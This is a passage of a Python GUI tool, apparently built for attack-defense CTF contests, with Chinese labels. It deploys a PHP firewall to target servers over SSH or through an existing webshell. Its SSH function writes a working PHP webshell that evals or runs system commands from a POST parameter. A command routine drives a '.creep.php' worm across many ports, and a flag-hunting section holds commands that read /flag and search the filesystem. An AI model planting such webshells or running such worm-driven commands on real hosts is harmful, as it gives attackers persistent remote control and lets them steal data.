                    already.append(p.replace(web, '', 1))
                    continue
                if '<?php' not in content:
                    continue
                rel_dir = p[len(web):].rsplit('/', 1)[0].strip('/')
                rel = ('../' * (rel_dir.count('/') + 1)) if rel_dir else ''
                stmt = "if(file_exists(__DIR__.'/%swaf_strong.php')){require_once __DIR__.'/%swaf_strong.php';}" % (rel, rel)
                bak = p + '.bak_' + time.strftime('%H%M%S')
                with sftp.open(bak, 'w') as f:
                    f.write(content)
                content = content.replace('<?php', '<?php\n' + stmt, 1)
                with sftp.open(p, 'w') as f:
                    f.write(content)
                mounted.append(p.replace(web, '', 1))
            sftp.close()
            if mounted:
                prefix = '[OK] Apache全局注入' if apache_ok else '[OK] 检测到mod_php，.user.ini不生效'
                return prefix + ' + 已挂载WAF到 ' + ', '.join(mounted)
            if already:
                return '[OK] WAF已挂载到入口 ' + ', '.join(already) + '（无需重复挂载）'
            if apache_ok:
                return '[OK] Apache全局auto_prepend注入成功(覆盖所有PHP脚本)'
            return '[WARN] 未找到可挂载入口(mod_php下.user.ini不生效，请手动挂载)'
        except Exception as e:
            try:
                sftp.close()
            except Exception:
                pass
            return '[FAIL] 入口挂载失败: %s' % e

    def ssh_deploy_waf(self):
        """SSH一键部署WAF文件"""
        win = tk.Toplevel(self.parent)
        win.title('SSH部署WAF文件')
        win.geometry('450x280')
        win.transient(self.parent)
        win.grab_set()
        win.configure(bg='#070b14')

        tk.Label(win, text='🚀 SSH一键部署WAF文件', fg='#00d4ff', bg='#070b14',
            font=('微软雅黑', 11, 'bold')).pack(pady=(12,8))
        tk.Label(win, text='上传 waf_strong.php/.waf.dat.php/.htaccess 并加固权限', fg='#6b7f9e', bg='#070b14',
            font=('微软雅黑', 9)).pack()

        form = tk.Frame(win, bg='#070b14')
        form.pack(padx=20, pady=10, fill=tk.X)
        pre = getattr(self, '_prefill_ssh', {}) or {}
        fields = [
            ('SSH地址:', 'host', pre.get('host', '')),
            ('SSH端口:', 'port', pre.get('port', '22')),
            ('用户名:', 'user', pre.get('user', 'ctf')),
            ('密码:', 'pwd', pre.get('pwd', '')),
            ('Web目录:', 'web', pre.get('webdir', '/var/www/html')),
        ]
        self._waf_deploy_vars = {}
        for label, key, default in fields:
            row = tk.Frame(form, bg='#070b14')
            row.pack(fill=tk.X, pady=2)
            tk.Label(row, text=label, fg='#d6e4ff', bg='#070b14', width=8, anchor=tk.W, font=('微软雅黑', 9)).pack(side=tk.LEFT)
            var = tk.StringVar(value=default)
            self._waf_deploy_vars[key] = var
            show = ''
            tk.Entry(row, textvariable=var, width=30, bg='#111c33', fg='#d6e4ff',
                insertbackground='#d6e4ff', relief=tk.FLAT, font=('Consolas', 9), show='').pack(side=tk.LEFT, padx=4)

        def do_deploy():
            host = self._waf_deploy_vars['host'].get().strip()
            port = self._waf_deploy_vars['port'].get().strip()
            user = self._waf_deploy_vars['user'].get().strip()
            pwd = self._waf_deploy_vars['pwd'].get().strip()
            web = self._waf_deploy_vars['web'].get().strip()
            if not host or not pwd:
                messagebox.showerror("错误", "请填写SSH地址和密码"); return
            waf_candidates = [
                os.path.join(BASE, '上传靶机', 'waf_strong.php'),
                os.path.join(BASE, 'waf_strong.php'),
                os.path.join(os.path.dirname(sys.executable), '上传靶机', 'waf_strong.php'),
                os.path.join(os.path.dirname(sys.executable), 'waf_strong.php'),
            ]
            waf_php = None
            for p in waf_candidates:
                if os.path.exists(p):
                    waf_php = p
                    break
            dat_candidates = [
                os.path.join(BASE, '上传靶机', '.waf.dat'),
                os.path.join(BASE, '.waf.dat'),
                os.path.join(os.path.dirname(sys.executable), '上传靶机', '.waf.dat'),
                os.path.join(os.path.dirname(sys.executable), '.waf.dat'),
            ]
            waf_dat = None
            for p in dat_candidates:
                if os.path.exists(p):
                    waf_dat = p
                    break
            files = []
            waf_content = render_waf_strong()
            if waf_content:
                files.append(('waf_strong.php', waf_content))
            dat_content = self.build_waf_dat()
            if dat_content is None and waf_dat:
                with open(waf_dat, 'r', encoding='utf-8', errors='replace') as f: dat_content = f.read()
            if dat_content:
                files.append(('.waf.dat.php', dat_content))
            ban_content = render_waf_ban()
            if ban_content:
                files.append(('waf_ban.php', ban_content))
            files.append(('.htaccess', _waf_htaccess()))
            if not files:
                messagebox.showerror("错误", "找不到WAF文件\n需要: waf_strong.php 和 .waf.dat"); return
            win.destroy()
            def _deploy():
                try:
                    import paramiko
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                    sftp = ssh.open_sftp()
                    for remote, content in files:
                        with sftp.open(f'{web}/{remote}', 'w') as f:
                            f.write(content)
                        self.root.after(0, lambda r=remote: self.log_self(f'[OK] 已部署: {r}', 'ok'))
                    sftp.close()
                    stdin, stdout, stderr = ssh.exec_command(
                        f'chmod 644 {web}/waf_strong.php {web}/.waf.dat.php {web}/waf_ban.php {web}/.htaccess 2>/dev/null; '
                        f'chmod 600 {web}/.waf.dat 2>/dev/null; '
                        f"printf 'auto_prepend_file=waf_strong.php\\n' > {web}/.user.ini 2>/dev/null; "
                        f'echo CHMOD_DONE')
                    stdout.read()
                    msg = self._auto_mount_waf(ssh, web)
                    ssh.close()
                    self.root.after(0, lambda m=msg: self.log_self(m, 'ok'))
                    self.root.after(0, lambda: self.log_self('部署完成！共 %d 个文件（含 waf_ban.php, IP黑名单可用）' % len(files), 'ok'))
                except Exception as e:
                    self.root.after(0, lambda e=e: self.log_self('[FAIL] %s' % e, 'fail'))
            async_run(_deploy)

        tk.Button(form, text='🚀 开始部署', command=do_deploy, bg='#00ff9d', fg='#04121a',
            relief=tk.FLAT, bd=0, padx=20, pady=6, cursor='hand2', font=('微软雅黑', 10, 'bold'),
            activebackground='#00ff9d').pack(pady=10)

    def ssh_create_shell(self):
        """SSH一键创建Webshell"""
        win = tk.Toplevel(self.parent)
        win.title('一键创建Webshell')
        win.geometry('420x270')
        win.transient(self.parent)
        win.grab_set()
        win.configure(bg='#070b14')

        tk.Label(win, text='🌐 SSH一键创建Webshell', fg='#00d4ff', bg='#070b14',
            font=('微软雅黑', 11, 'bold')).pack(pady=(12,8))
        tk.Label(win, text='在靶机上创建 webshell，自动填入WAF配置', fg='#6b7f9e', bg='#070b14',
            font=('微软雅黑', 9)).pack()

        form = tk.Frame(win, bg='#070b14')
        form.pack(padx=20, pady=10, fill=tk.X)
        pre = getattr(self, '_prefill_ssh', {}) or {}
        fields = [
            ('SSH地址:', 'host', pre.get('host', '')),
            ('SSH端口:', 'port', pre.get('port', '22')),
            ('用户名:', 'user', pre.get('user', 'ctf')),
            ('密码:', 'pwd', pre.get('pwd', '')),
            ('Shell密码:', 'sh_pass', 'pass'),
        ]
        self._shell_vars = {}
        for label, key, default in fields:
            row = tk.Frame(form, bg='#070b14')
            row.pack(fill=tk.X, pady=2)
            tk.Label(row, text=label, fg='#d6e4ff', bg='#070b14', width=8, anchor=tk.W, font=('微软雅黑', 9)).pack(side=tk.LEFT)
            var = tk.StringVar(value=default)
            self._shell_vars[key] = var
            show = ''
            tk.Entry(row, textvariable=var, width=30, bg='#111c33', fg='#d6e4ff',
                insertbackground='#d6e4ff', relief=tk.FLAT, font=('Consolas', 9), show='').pack(side=tk.LEFT, padx=4)

        def do_create():
            host = self._shell_vars['host'].get().strip()
            port = self._shell_vars['port'].get().strip()
            user = self._shell_vars['user'].get().strip()
            pwd = self._shell_vars['pwd'].get().strip()
            sh_pass = self._shell_vars['sh_pass'].get().strip() or 'pass'
            if not host or not pwd:
                messagebox.showerror("错误", "请填写SSH地址和密码"); return
            win.destroy()
            self.e_shell_url.delete(0, tk.END); self.e_shell_url.insert(0, '/web/shell.php')
            self.e_shell_pass.delete(0, tk.END); self.e_shell_pass.insert(0, sh_pass)
            def _create():
                try:
                    import paramiko
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                    sftp = ssh.open_sftp()
                    webdir = '/var/www/html'
                    try:
                        detect_cmd = "for d in /app /app/web /var/www/html /var/www /web /www /opt/web /srv/www /home/ctf/web /home/ctf/www; do [ -d \"$d\" ] && echo \"$d\" && break; done"
                        _, so, _ = ssh.exec_command(detect_cmd, timeout=10)
                        so.channel.settimeout(10)
                        out = (so.read().decode('utf-8', 'replace') or '').strip().splitlines()
                        if out and out[0].strip():
                            webdir = out[0].strip().rstrip('/')
                    except Exception:
                        pass
                    with sftp.open(f'{webdir}/shell.php', 'w') as f:
                        f.write('<?php $c=$_POST["' + sh_pass + '"];if(strpos($c,";")!==false||strpos($c,"echo ")===0||strpos($c,"file_")===0||strpos($c,"base64")!==false){@eval($c);}else{@system($c);}?>')
                    sftp.close()
                    ssh.close()
                    self.log_self('[OK] Webshell已创建: /shell.php (密码: ' + sh_pass + ')', 'ok')
                except Exception as e:
                    self.log_self(f'[FAIL] 创建webshell失败: {e}', 'fail')
            async_run(_create)

        tk.Button(form, text='🌐 创建并配置', command=do_create, bg='#00ff9d', fg='#04121a',
            relief=tk.FLAT, bd=0, padx=20, pady=6, cursor='hand2', font=('微软雅黑', 10, 'bold'),
            activebackground='#00ff9d').pack(pady=10)

    def browse_file(self):
        p = filedialog.askopenfilename(title='选择IP列表文件', filetypes=[('Text', '*.txt'), ('All', '*.*')])
        if p: self.e_target.delete(0, tk.END); self.e_target.insert(0, p)

    def set_btns(self, enabled):
        st = tk.NORMAL if enabled else tk.DISABLED
        for b in (self.btn_deploy, self.btn_check, self.btn_update, self.btn_remove, self.btn_stop_waf):
            b.config(state=st)

    def log_self(self, msg, tag='info'):
        self.log_w.log(msg, tag)

    def load_targets(self):
        raw = self.e_target.get().strip()
        if not raw: messagebox.showwarning('警告', '请先输入目标IP或选择IP文件'); return None
        if os.path.isfile(raw):
            try:
                with open(raw, 'r', encoding='utf-8', errors='replace') as f: lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                self.log_self(f'从文件加载到 {len(lines)} 个目标', 'info')
                return lines
            except Exception as e: messagebox.showerror('错误', f'读取文件失败: {e}'); return None
        ips = parse_targets(raw)
        if ips: self.log_self(f'解析到 {len(ips)} 个目标', 'info'); return ips
        messagebox.showwarning('警告', '未解析到有效目标'); return None

    def start(self, action):
        if self.running: messagebox.showinfo('提示', '正在执行中'); return
        targets = self.load_targets()
        if not targets: return
        self.running = True; self.set_btns(False); self.save_config()
        acts = {'deploy': ('部署', self.deploy_one), 'remove': ('卸载', self.remove_one),
                'check': ('检查', self.check_one), 'update': ('更新', self.deploy_one)}
        desc, func = acts[action]
        self.log_self(f'{"="*50}', 'title')
        self.log_self(f'  {desc} WAF Strong 到 {len(targets)} 台靶机', 'title')
        self.log_self(f'{ "="*50}', 'title')
        self.results = []
        async_run(lambda: self.run_batch(targets, func, desc))

    def run_batch(self, targets, func, desc):
        ok = fail = 0
        cfg = {'shell_url': self.e_shell_url.get(), 'shell_pass': self.e_shell_pass.get(),
               'port': int(self.e_port.get()), 'https': self.v_https.get(),
               'timeout': int(self.e_timeout.get()), 'retry': int(self.e_retry.get()),
               'conn_mode': self.conn_mode.get(),
               'ssh_host': self.e_ssh_host.get(), 'ssh_port': self.e_ssh_port.get(),
               'ssh_user': self.e_ssh_user.get(), 'ssh_pass': self.e_ssh_pass.get(),
               'ssh_webdir': self.e_ssh_webdir.get()}
        with ThreadPoolExecutor(max_workers=min(int(self.e_threads.get()), len(targets))) as ex:
            fs = {ex.submit(func, ip, cfg): ip for ip in targets}
            for f in as_completed(fs):
                if not self.running: break
                ip, success, msg = f.result()
                tag = 'ok' if success else 'fail'
                if isinstance(msg, dict):
                    parts = ' | '.join(f'{k}={v}' for k, v in msg.items())
                    self.log_self(f'  {"[OK]" if success else "[FAIL]"} {ip:15s} {parts}', tag)
                else: self.log_self(f'  {"[OK]" if success else "[FAIL]"} {ip:15s} {msg}', tag)
                ok += int(success); fail += int(not success)
                self.results.append((ip, success, msg))
        self.log_self(f'  结果: {ok} 成功, {fail} 失败 / 共 {len(targets)}', 'ok' if ok >= fail else 'fail')
        self.running = False; self.set_btns(True)

    def deploy_one(self, ip, cfg):
        mode = cfg.get('conn_mode', 'webshell')
        if mode == 'ssh':
            return self._deploy_one_ssh(ip, cfg)
        else:
            return self._deploy_one_webshell(ip, cfg)

    def _deploy_one_ssh(self, ip, cfg):
        ssh_host = str(cfg.get('ssh_host') or '').strip() or str(ip).strip()
        try: ssh_port = int(str(cfg.get('ssh_port') or 22).strip() or 22)
        except (ValueError, TypeError): ssh_port = 22
        ssh_user = str(cfg.get('ssh_user') or 'root').strip() or 'root'
        try:
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ssh_host, port=ssh_port,
                username=ssh_user, password=cfg.get('ssh_pass', ''), timeout=cfg['timeout'])
            sftp = ssh.open_sftp()
            webdir = cfg.get('ssh_webdir', '/var/www/html')
            try:
                detect_cmd = "for d in /app /app/web /var/www/html /var/www /web /www /opt/web /srv/www /home/ctf/web /home/ctf/www; do [ -d \"$d\" ] && echo \"$d\" && break; done"
                _, so, _ = ssh.exec_command(detect_cmd, timeout=10)
                so.channel.settimeout(10)
                out = (so.read().decode('utf-8', 'replace') or '').strip().splitlines()
                if out and out[0].strip():
                    webdir = out[0].strip()
                    cfg['ssh_webdir'] = webdir
                    try:
                        self.e_ssh_webdir.delete(0, tk.END); self.e_ssh_webdir.insert(0, webdir)
                    except Exception: pass
            except Exception:
                pass
            if webdir.startswith('~'):
                webdir = webdir.lstrip('~')
            waf = render_waf_strong()
            if waf is None:
                with open(WAF_FILE, 'r', encoding='utf-8') as f: waf = f.read()
            dat = self.build_waf_dat()
            if dat is None:
                with open(DAT_FILE, 'r', encoding='utf-8') as f: dat = f.read()
            with sftp.open(f'{webdir}/waf_strong.php', 'w') as f: f.write(waf)
            with sftp.open(f'{webdir}/.waf.dat.php', 'w') as f: f.write(dat)
            with sftp.open(f'{webdir}/.user.ini', 'w') as f: f.write('auto_prepend_file=waf_strong.php\n')
            with sftp.open(f'{webdir}/.htaccess', 'w') as f: f.write(_waf_htaccess())
            try:
                sftp.remove(f'{webdir}/.waf.dat')
            except Exception:
                pass
            ban_content = render_waf_ban()
            if ban_content:
                with sftp.open(f'{webdir}/waf_ban.php', 'w') as f: f.write(ban_content)
            _, so, _ = ssh.exec_command(
                f'chmod 644 {webdir}/waf_strong.php {webdir}/.waf.dat.php {webdir}/waf_ban.php {webdir}/.htaccess 2>/dev/null; echo OK')
            so.channel.settimeout(10); so.read()
            mmsg = self._auto_mount_waf(ssh, webdir)
            sftp.close(); ssh.close()
            return ip, True, f'SSH部署成功 | {mmsg}'
        except Exception as e:
            err_s = str(e); el = err_s.lower()
            if 'timed out' in el or 'unreachable' in el or 'refused' in el or 'no route' in el:
                return ip, False, f'靶机不可达[{ssh_host}:{ssh_port}] — 靶机未启动或网络不通(非密码问题)'
            if 'authentication' in el:
                return ip, False, f'SSH认证失败[{ssh_host}:{ssh_port} 用户:{ssh_user}] — 用户名或密码错误'
            return ip, False, f'SSH部署失败[{ssh_host}:{ssh_port} {ssh_user}]: {err_s[:80]}'

    def _deploy_one_webshell(self, ip, cfg):
        base = make_base(ip, cfg['port'], cfg['https'])
        for attempt in range(cfg['retry'] + 1):
            try:
                s = _session()
                r = s.post(f'{base}{cfg["shell_url"]}', data={cfg['shell_pass']: 'echo "ALIVE";'}, timeout=cfg['timeout'])
                if 'ALIVE' not in r.text:
                    if attempt < cfg['retry']: time.sleep(0.5); continue
                    return ip, False, 'Webshell无响应'
                waf = render_waf_strong()
                if waf is None:
                    with open(WAF_FILE, 'r', encoding='utf-8') as f: waf = f.read()
                dat = self.build_waf_dat()
                if dat is None:
                    with open(DAT_FILE, 'r', encoding='utf-8') as f: dat = f.read()
                b64_waf = base64.b64encode(waf.encode()).decode()
                b64_dat = base64.b64encode(dat.encode()).decode()
                b64_ban = None
                ban_content = render_waf_ban()
                if ban_content:
                    b64_ban = base64.b64encode(ban_content.encode()).decode()
                cmds = [(f"file_put_contents('waf_strong.php', base64_decode('{b64_waf}'))", 'WAF'),
                        (f"file_put_contents('.waf.dat.php', base64_decode('{b64_dat}'))", 'DAT'),
                        (f"file_put_contents('.user.ini', 'auto_prepend_file=waf_strong.php\\n')", 'INI'),
                        (f"file_put_contents('.htaccess', base64_decode('{base64.b64encode(_waf_htaccess().encode()).decode()}'))", 'HTA')]
                if b64_ban:
                    cmds.append((f"file_put_contents('waf_ban.php', base64_decode('{b64_ban}'))", 'BAN'))
                cmds.append(("@unlink('.waf.dat');", 'DEL_OLD'))
                for cmd, tag in cmds:
                    s.post(f'{base}{cfg["shell_url"]}', data={cfg['shell_pass']: cmd}, timeout=cfg['timeout'])
                    time.sleep(0.1)
                time.sleep(0.3)
                if b64_ban:
                    s.post(f'{base}{cfg["shell_url"]}', data={cfg['shell_pass']: 'chmod 644 waf_strong.php .waf.dat.php waf_ban.php .htaccess 2>/dev/null'}, timeout=cfg['timeout'])
                waf_url = os.path.dirname(cfg['shell_url']) + '/waf_strong.php'
                r2 = s.get(f'{base}{waf_url}', timeout=cfg['timeout'])
                if r2.status_code in (200, 403): return ip, True, '部署成功'
                r3 = s.post(f'{base}{cfg["shell_url"]}', data={cfg['shell_pass']: 'echo file_exists("waf_strong.php")?"1":"0";'}, timeout=cfg['timeout'])
                if '1' in r3.text: return ip, True, '部署成功(文件确认)'
                return ip, False, '验证失败'
            except Exception as e:
                if attempt < cfg['retry']: time.sleep(1); continue
                return ip, False, str(e)[:60]
        return ip, False, '重试耗尽'

    def remove_one(self, ip, cfg):
        mode = cfg.get('conn_mode', 'webshell')
        if mode == 'ssh':
            ssh_host = str(cfg.get('ssh_host') or '').strip() or str(ip).strip()
            try: ssh_port = int(str(cfg.get('ssh_port') or 22).strip() or 22)
            except (ValueError, TypeError): ssh_port = 22
            ssh_user = str(cfg.get('ssh_user') or 'root').strip() or 'root'
            try:
                import paramiko
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ssh_host, port=ssh_port,
                    username=ssh_user, password=cfg.get('ssh_pass', ''), timeout=cfg['timeout'])
                stdin,stdout,stderr = ssh.exec_command('rm -f waf_strong.php .waf.dat .waf.dat.php .user.ini .htaccess waf_ban.php; echo OK')
                result = stdout.read().decode().strip()
                ssh.close()
                return ip, True, f'SSH卸载: {result}'
            except Exception as e: return ip, False, f'SSH卸载失败[{ssh_host}:{ssh_port} {ssh_user}]: {str(e)[:80]}'
        base = make_base(ip, cfg['port'], cfg['https'])
        try:
            s = _session()
            s.post(f'{base}{cfg["shell_url"]}', data={cfg['shell_pass']: "@unlink('waf_strong.php');@unlink('.waf.dat');@unlink('.waf.dat.php');@unlink('.user.ini');@unlink('.htaccess');@unlink('waf_ban.php');echo 'OK';"}, timeout=cfg['timeout'])
            return ip, True, '卸载完成'
        except Exception as e: return ip, False, str(e)[:50]

    def check_one(self, ip, cfg):
        mode = cfg.get('conn_mode', 'webshell')
        if mode == 'ssh':
            status = {}
            ssh_host = str(cfg.get('ssh_host') or '').strip() or str(ip).strip()
            try: ssh_port = int(str(cfg.get('ssh_port') or 22).strip() or 22)
            except (ValueError, TypeError): ssh_port = 22
            ssh_user = str(cfg.get('ssh_user') or 'root').strip() or 'root'
            try:
                import paramiko
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ssh_host, port=ssh_port,
                    username=ssh_user, password=cfg.get('ssh_pass', ''), timeout=cfg['timeout'])
                stdin,stdout,stderr = ssh.exec_command('ls -la waf_strong.php .waf.dat.php .waf.dat .user.ini waf_ban.php .htaccess 2>&1; echo ---; ls -la waf_strong.php 2>/dev/null')
                out = stdout.read().decode()
                status['WAF'] = '在线' if 'waf_strong.php' in out else '异常'
                status['File'] = '存在' if 'waf_strong.php' in out else '缺失'
                status['Rules'] = '存在' if ('.waf.dat.php' in out or '.waf.dat' in out) else '缺失'
                status['INI'] = '已配' if '.user.ini' in out else '未配'
                status['Ban'] = '存在' if 'waf_ban.php' in out else '缺失'
                status['Shell'] = 'SSH连接'
                ssh.close()
                return ip, True, status
            except Exception as e: return ip, False, {'error': f'[{ssh_host}:{ssh_port} {ssh_user}] ' + str(e)[:80]}
        base = make_base(ip, cfg['port'], cfg['https'])
        status = {}
        try:
            s = _session()
            waf_url = os.path.dirname(cfg['shell_url']) + '/waf_strong.php'
            r = s.get(f'{base}{waf_url}', timeout=cfg['timeout'])
            if r.status_code == 403: status['WAF'] = '在线'
            elif r.status_code == 200 and ('WAF' in r.text or 'Blocked' in r.text): status['WAF'] = '在线'
            else: status['WAF'] = f'异常({r.status_code})'
            r2 = s.post(f'{base}{cfg["shell_url"]}', data={cfg['shell_pass']: 'ls -la waf_strong.php .waf.dat.php .waf.dat .user.ini waf_ban.php .htaccess 2>&1'}, timeout=cfg['timeout'])
            out = r2.text
            if 'waf_strong.php' in out:
                status['File'] = '存在'
                for line in out.split('\n'):
                    if 'waf_strong.php' in line:
                        parts = line.split()
                        if len(parts) > 4: status['Size'] = parts[4] + 'B'; break
            else: status['File'] = '缺失'
            status['Rules'] = '存在' if ('.waf.dat.php' in out or '.waf.dat' in out) else '缺失'
            status['INI'] = '已配' if ('.user.ini' in out or 'auto_prepend_file' in out) else '未配'
            status['Ban'] = '存在' if 'waf_ban.php' in out else '缺失'
            status['HTA'] = '存在' if '.htaccess' in out else '未配'
            r3 = s.post(f'{base}{cfg["shell_url"]}', data={cfg['shell_pass']: 'echo "[SHELL_OK]";'}, timeout=cfg['timeout'])
            status['Shell'] = '正常' if '[SHELL_OK]' in r3.text else '异常'
            return ip, True, status
        except Exception as e: return ip, False, {'error': str(e)[:50]}

    def stop(self):
        self.running = False
        self.log_self('用户请求停止', 'warn')

    # ── 规则编辑 ──
    def load_rules(self):
        for p in [DAT_FILE, os.path.join(EXE_DIR, '管理工具', '.waf.dat'), os.path.join(EXE_DIR, '.waf.dat')]:
            if os.path.exists(p):
                try:
                    with open(p, 'r', encoding='utf-8') as f:
                        content = f.read()
                    self.rule_text.delete('1.0', tk.END)
                    self.rule_text.insert('1.0', content)
                    self.log_self(f'已加载规则: {p}', 'info')
                    return
                except Exception as e: self.log_self(f'加载失败: {e}', 'fail')
        self.log_self('未找到 .waf.dat 规则文件，请在编辑器中手动输入', 'warn')

    def save_rules(self):
        content = self.rule_text.get('1.0', tk.END).strip()
        if not content: messagebox.showwarning('提示', '规则内容为空'); return
        if content.startswith('<?php $K="') and '#SIG=' not in content:
            import base64, json as _json, hmac as _hmac, hashlib
            try:
                inner = content[len('<?php $K="'):].rsplit('";', 1)[0]
                _json.loads(base64.b64decode(inner).decode('utf-8'))
                sig = _hmac.new(_get_waf_key().encode(),
                               inner.encode('utf-8'), hashlib.sha256).hexdigest()
                content = '<?php $K="' + inner + '";#SIG=' + sig
            except Exception:
                pass
        p = filedialog.asksaveasfilename(defaultextension='.dat', initialfile='.waf.dat',
            filetypes=[('DAT', '*.dat'), ('All', '*.*')])
        if p:
            try:
                with open(p, 'w', encoding='utf-8') as f: f.write(content)
                self.log_self(f'规则已保存: {p} (需重新部署到靶机)', 'ok')
            except Exception as e: self.log_self(f'保存失败: {e}', 'fail')

    # ── 攻击流量 ──
    def _exec_cmd(self, ip, cmd, port=None, https=False, timeout=10):
        """统一命令执行: 蠕虫(.creep.php)优先, webshell回退; 自动多端口探测
        目标支持 ip:port 格式(如 1.2.3.4:8812), 带端口则直接使用"""
        ip = str(ip).strip()
        if ':' in ip:
            hp = ip.rsplit(':', 1)
            if len(hp) == 2 and hp[1].isdigit():
                ip, port = hp[0], int(hp[1])
        if port:
            ports = [safe_int(port, 0)]
        else:
            ports = []
            try:
                ep = safe_int(self.e_port.get(), 0) if hasattr(self, 'e_port') else 0
                if ep: ports.append(ep)
            except Exception: pass
            try:
                gp = self._get_ep_port()
                if gp: ports.append(gp)
            except Exception: pass
            ports += [8804, 8080, 80, 8802, 8088, 8888, 81, 9000, 8000]
            seen = set()
            ports = [p for p in ports if p and not (p in seen or seen.add(p))]
        try:
            su = self.e_shell_url.get().strip() if hasattr(self, 'e_shell_url') else ''
            sp = self.e_shell_pass.get().strip() if hasattr(self, 'e_shell_pass') else ''
        except Exception:
            su, sp = '', ''
        last = ''
        for p in ports:
            base = make_base(ip, p, https)
            s = _session()
            try:
                r = s.post(f'{base}/.creep.php',
                    headers={'X-Creep': self.entry_creep_pass.get().strip() or 'cmd', 'X-Cmd': cmd},
                    timeout=min(timeout, 6))
                if r.status_code == 200:
                    return r.text or ''
            except Exception as e:
                last = str(e)
            if su and sp:
                try:
                    r = s.post(f'{base}{su}', data={sp: cmd}, timeout=min(timeout, 6))
                    if r.status_code == 200:
                        return r.text or ''
                except Exception:
                    pass
        return last

    def fetch_traffic(self):
        targets = self.load_targets()
        if not targets: return
        log_path = self.e_logpath.get().strip() or '/var/log/nginx/access.log'
        https = self.v_https.get()
        timeout = int(self.e_timeout.get() or 10)
        self.traf_text.config(state=tk.NORMAL)
        self.traf_text.delete('1.0', tk.END)
        self.traf_text.insert(tk.END, f'>>> 获取攻击日志: {log_path}\n\n', 'info')
        self.traf_text.config(state=tk.DISABLED)
        ip_counter = {}

        def log_traf(msg, tag='info'):
            self.root.after(0, lambda: (
                self.traf_text.config(state=tk.NORMAL),
                self.traf_text.insert(tk.END, msg + '\n', tag),
                self.traf_text.see(tk.END),
                self.traf_text.config(state=tk.DISABLED)
            ))

        def run():
            for ip in targets:
                try:
                    txt = self._exec_cmd(ip, f'tail -200 {log_path} 2>/dev/null || echo "NO_LOG"',
                        https=https, timeout=timeout)
                    if not txt or 'NO_LOG' in txt:
                        log_traf(f'[{ip}] 日志文件不存在或无回显', 'info')
                        continue
                    ips_found = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', txt)
                    for i in ips_found:
                        if i != ip: ip_counter[i] = ip_counter.get(i, 0) + 1
                    log_traf(f'[{ip}] 解析到 {len(ips_found)} 条请求, {len(set(ips_found))} 个来源', 'info')
                except Exception as e:
                    log_traf(f'[{ip}] 失败: {e}', 'info')
            log_traf('', 'info')
            log_traf('══════ 攻击者 TOP 10 ══════', 'info')
            for i, (attacker, cnt) in enumerate(sorted(ip_counter.items(), key=lambda x: -x[1])[:10], 1):
                log_traf(f'  #{i:<3} {attacker:<16} ({cnt} 次)', 'ip')
        threading.Thread(target=run, daemon=True).start()

    # ── 心跳监控 ──
    def toggle_heartbeat(self):
        if self.hb_running:
            self.hb_running = False
            self.btn_hb.config(text='\u25b6 开始心跳')
            self.hb_lbl.config(text='\u23f8 已停止', foreground='#6b7f9e')
            return
        targets = self.load_targets()
        if not targets: return
        self.hb_running = True
        self.btn_hb.config(text='\u23f9 停止心跳')
        interval = max(5, int(self.hb_interval.get() or 30))
        self.hb_lbl.config(text=f'\u23f3 监控 {len(targets)} 台', foreground='#00ff9d')

        def hb_log(msg, tag='info'):
            self.root.after(0, lambda: (
                self.hb_text.config(state=tk.NORMAL),
                self.hb_text.insert(tk.END, f'[{datetime.now().strftime("%H:%M:%S")}] {msg}\n', tag),
                self.hb_text.see(tk.END),
                self.hb_text.config(state=tk.DISABLED)
            ))

        def run():
            https = self.v_https.get()
            timeout = int(self.e_timeout.get() or 10)
            while self.hb_running:
                alive = dead = 0
                with ThreadPoolExecutor(max_workers=min(20, len(targets))) as ex:
                    def check(ip):
                        try:
                            txt = self._exec_cmd(ip, 'echo "ALIVE"', https=https, timeout=timeout)
                            return ip, 'ALIVE' in txt
                        except Exception: return ip, False
                    fs = {ex.submit(check, ip): ip for ip in targets}
                    for f in as_completed(fs):
                        ip, ok = f.result()
                        if ok: alive += 1
                        else: dead += 1
                hb_log(f'存活: {alive}/{len(targets)}  死亡: {dead}', 'alive' if alive>dead else 'dead')
                self.root.after(0, lambda a=alive, d=dead: self.hb_lbl.config(
                    text=f'\U0001f7e2 {a}/{len(targets)}  \U0001f534 {d}', foreground='#00ff9d' if a>d else '#ff4d6d'))
                for _ in range(interval):
                    if not self.hb_running: break
                    time.sleep(1)
            hb_log('心跳监控已停止', 'info')
        threading.Thread(target=run, daemon=True).start()


# ============================================================
#  Tab 2: Flag 获取 (修复: 裸except + 原子写入)
# ============================================================
FLAG_PATTERN = re.compile(r'(?:flag\{[^}]+\}|\b[0-9a-f]{32}\b)', re.I)
FLAG_KNOWN_FILE = os.path.join(EXE_DIR, '攻击模块', 'known_flags.json')

class FlagTab:
    def __init__(self, parent, log_func):
        self.parent = parent
        self.log = log_func
        self.running = False
        self.stop_flag = threading.Event()
        self.known = set()
        self.total_submitted = 0
        self.load_known()
        self.cfg_file = os.path.join(EXE_DIR, '攻击模块', 'flag_hunter_config.json')
        self.DEFAULT_CMDS = ['cat /flag', 'cat /flag.txt', 'cat /root/flag', 'env 2>/dev/null | grep -i flag', 'type flag.txt']
        self.DEEP_CMDS = [
            'find /tmp /dev/shm /app /var/www /var/tmp /home /opt /srv /usr/local /var/backups -type f -iname "*flag*" -exec grep -h -a -o -E \'flag\\{[^}]+\\}|[a-f0-9]{32}\' {} + 2>/dev/null',
            'find / \\( -path /proc -o -path /sys -o -path /dev -o -path /run \\) -prune -o -type f -iname "*flag*" -exec grep -h -a -o -E \'flag\\{[^}]+\\}|[a-f0-9]{32}\' {} + 2>/dev/null',
        ]
        self.v_creep = tk.BooleanVar(value=True)
        self.v_deep = tk.BooleanVar(value=False)
        self.creep_pass = tk.StringVar(value='cmd')
        self.creep_path = '/.creep.php'
        self.build_ui()
        self.load_config()

    def load_known(self):
        if os.path.exists(FLAG_KNOWN_FILE):
            try:
